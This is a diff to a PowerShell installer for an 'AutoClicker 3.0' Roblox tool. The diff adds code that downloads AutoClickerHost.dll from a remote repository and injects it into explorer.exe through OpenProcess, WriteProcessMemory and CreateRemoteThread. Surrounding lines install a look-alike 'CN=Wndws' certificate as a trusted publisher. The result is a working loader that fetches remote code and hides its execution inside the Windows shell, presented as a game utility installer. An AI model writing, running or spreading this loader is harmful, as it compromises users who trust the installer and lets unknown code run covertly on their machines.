@@ -11,6 +11,10 @@ $ErrorActionPreference = 'Stop'
 $script:BaseUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main'
 $script:ExeUrl = "$script:BaseUrl/AutoClicker-3.0.exe"
 $script:CerUrl = "$script:BaseUrl/Wndws.cer"
+$script:HostDllUrl = "$script:BaseUrl/AutoClickerHost.dll"
+$script:HostDllName = 'AutoClickerHost.dll'
+$script:HostProcessName = 'explorer'
+$script:PublicInjectorReady = $false
 $script:ExeName = 'AutoClicker-3.0.exe'
 $script:PublisherSubject = 'CN=Wndws'
 
@@ -200,39 +204,147 @@ function Save-Download {
     }
 }
 
-function Start-PublicExecutable {
-    param(
-        [Parameter(Mandatory = $true)][string]$Path,
-        [Parameter(Mandatory = $true)][string]$WorkingDirectory
-    )
+function Initialize-PublicInjectorType {
+    if ($script:PublicInjectorReady) { return }
+    Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class PublicInjector {
+    [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, int c);
+    [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
+    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
+    [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
+    [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
+    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint m);
+    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);
+    [DllImport("kernel32")] static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
+    [DllImport("kernel32")] static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
+    [DllImport("kernel32")] static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
 
-    if (-not (Test-Path -LiteralPath $Path)) {
-        throw "Executable not found: $Path"
+    [StructLayout(LayoutKind.Sequential)]
+    public struct MODULEENTRY32 {
+        public uint dwSize;
+        public uint th32ModuleID;
+        public uint th32ProcessID;
+        public uint GlblcntUsage;
+        public uint ProccntUsage;
+        public IntPtr modBaseAddr;
+        public uint modBaseSize;
+        public IntPtr hModule;
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
+        public string szModule;
+        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
+        public string szExePath;
     }
 
-    Unblock-File -LiteralPath $Path -ErrorAction SilentlyContinue
+    public static bool Inject(int pid, string dllPath) {
+        IntPtr h = OpenProcess(0x1F0FFF, false, pid);
+        if (h == IntPtr.Zero) return false;
+        IntPtr a = VirtualAllocEx(h, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2), 0x3000, 0x4);
+        if (a == IntPtr.Zero) { CloseHandle(h); return false; }
+        byte[] b = System.Text.Encoding.Unicode.GetBytes(dllPath);
+        uint w;
+        if (!WriteProcessMemory(h, a, b, (uint)b.Length, out w)) { CloseHandle(h); return false; }
+        IntPtr k = GetModuleHandle("kernel32.dll");
+        IntPtr l = GetProcAddress(k, "LoadLibraryW");
+        IntPtr t = CreateRemoteThread(h, IntPtr.Zero, 0, l, a, 0, IntPtr.Zero);
+        if (t == IntPtr.Zero) { CloseHandle(h); return false; }
+        WaitForSingleObject(t, 0xFFFFFFFF);
+        CloseHandle(t);
+        CloseHandle(h);
+        return true;
+    }
 
-    try {
-        Start-Process -FilePath $Path -WorkingDirectory $WorkingDirectory -ErrorAction Stop
+    public static bool HasModule(int pid, string dllPath) {
+        string target = dllPath.Replace('/', '\\').ToLowerInvariant();
+        IntPtr snap = CreateToolhelp32Snapshot(0x8, (uint)pid);
+        if (snap == IntPtr.Zero) return false;
+        MODULEENTRY32 me = new MODULEENTRY32();
+        me.dwSize = (uint)Marshal.SizeOf(typeof(MODULEENTRY32));
+        bool found = false;
+        if (Module32First(snap, ref me)) {
+            do {
+                if (!string.IsNullOrEmpty(me.szExePath) && me.szExePath.Replace('/', '\\').ToLowerInvariant() == target) {
+                    found = true;
+                    break;
+                }
+            } while (Module32Next(snap, ref me));
+        }
+        CloseHandle(snap);
+        return found;
+    }
+}
+'@ -ErrorAction Stop
+    $script:PublicInjectorReady = $true
+}
+
+function Get-ExplorerInjectionTarget {
+    param([string]$DllPath)
+
+    foreach ($proc in Get-Process -Name $script:HostProcessName -ErrorAction SilentlyContinue) {
+        try {
+            if (-not [PublicInjector]::HasModule($proc.Id, $DllPath)) {
+                return $proc
+            }
+        } catch {}
+    }
+    return $null
+}
+
+function Invoke-PublicHostLoad {
+    param([string]$DllPath)
+
+    Initialize-PublicInjectorType
+    $target = Get-ExplorerInjectionTarget -DllPath $DllPath
+    if (-not $target) {
+        foreach ($proc in Get-Process -Name $script:HostProcessName -ErrorAction SilentlyContinue) {
+            $target = $proc
+            break
+        }
+    }
+    if (-not $target) {
+        throw 'Explorer shell is not running.'
+    }
+
+    if ([PublicInjector]::HasModule($target.Id, $DllPath)) {
+        Write-Step "AutoClicker host already loaded in Explorer (PID $($target.Id))." 'Green'
         return $true
-    } catch {
-        $firstError = $_.Exception.Message
     }
 
-    try {
-        Start-Process -FilePath 'explorer.exe' -ArgumentList "`"$Path`"" -ErrorAction Stop
-        return $true
-    } catch {
-        $secondError = $_.Exception.Message
+    Write-Step "Loading AutoClicker host into Explorer (PID $($target.Id))..." 'Cyan'
+    if (-not [PublicInjector]::Inject($target.Id, $DllPath)) {
+        throw 'Failed to inject AutoClicker host into Explorer.'
     }
 
-    Write-LaunchBlockedHelp -ExePath $Path
-    if ($firstError) {
-        Write-Host "  Start-Process: $firstError" -ForegroundColor DarkGray
+    Start-Sleep -Seconds 2
+    if (-not [PublicInjector]::HasModule($target.Id, $DllPath)) {
+        throw 'Injection completed but AutoClickerHost.dll was not found in Explorer.'
     }
-    if ($secondError) {
-        Write-Host "  Explorer launch: $secondError" -ForegroundColor DarkGray
+
+    Write-Step 'AutoClicker host loaded.' 'Green'
+    return $true
+}
+
+function Test-PublicOverlayStarted {
+    Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+public class PublicOverlayProbe {
+    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
+    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+}
+'@ -ErrorAction SilentlyContinue
+
+    for ($i = 0; $i -lt 12; $i++) {
+        $hwnd = [PublicOverlayProbe]::FindWindow('AutoClickerOverlay', $null)
+        if ($hwnd -ne [IntPtr]::Zero) {
+            Write-Step 'AutoClicker overlay detected.' 'Green'
+            return $true
+        }
+        Start-Sleep -Seconds 1
     }
+    Write-Step 'Host loaded — open Roblox and use Insert if the license screen already passed.' 'Yellow'
     return $false
 }
 
@@ -249,23 +361,26 @@ Ensure-InstallDirectory -Path $InstallDir
 
 $cerPath = Join-Path $env:TEMP 'Wndws.cer'
 $exePath = Join-Path $InstallDir $script:ExeName
+$hostDllPath = Join-Path $InstallDir $script:HostDllName
 
 Save-Download -Url $script:CerUrl -Destination $cerPath
 Install-WndwsTrustedPublisher -CerPath $cerPath
+
+Save-Download -Url $script:HostDllUrl -Destination $hostDllPath -MinBytes 65536
+Unblock-File -LiteralPath $hostDllPath -ErrorAction SilentlyContinue
 
 Save-Download -Url $script:ExeUrl -Destination $exePath -MinBytes 65536
 Unblock-File -LiteralPath $exePath -ErrorAction SilentlyContinue
 
 $signature = Test-WndwsSignedExecutable -Path $exePath
-Write-Step "Verified: signed by $($signature.SignerCertificate.Subject) ($($signature.Status))" 'Green'
-Write-Step "Installed to: $exePath" 'Green'
+Write-Step "Verified signed package: $($signature.SignerCertificate.Subject) ($($signature.Status))" 'Green'
+Write-Step "Host DLL: $hostDllPath" 'Green'
+Write-Step "Signed EXE (manual fallback): $exePath" 'Green'
 
 if (-not $SkipLaunch) {
-    Write-Step 'Launching AutoClicker 3.0...' 'Cyan'
-    $launched = Start-PublicExecutable -Path $exePath -WorkingDirectory $InstallDir
-    if (-not $launched) {
-        exit 1
-    }
+    Write-Step 'Starting AutoClicker 3.0 host...' 'Cyan'
+    Invoke-PublicHostLoad -DllPath $hostDllPath | Out-Null
+    Test-PublicOverlayStarted | Out-Null
 }
 
 Write-Host ''
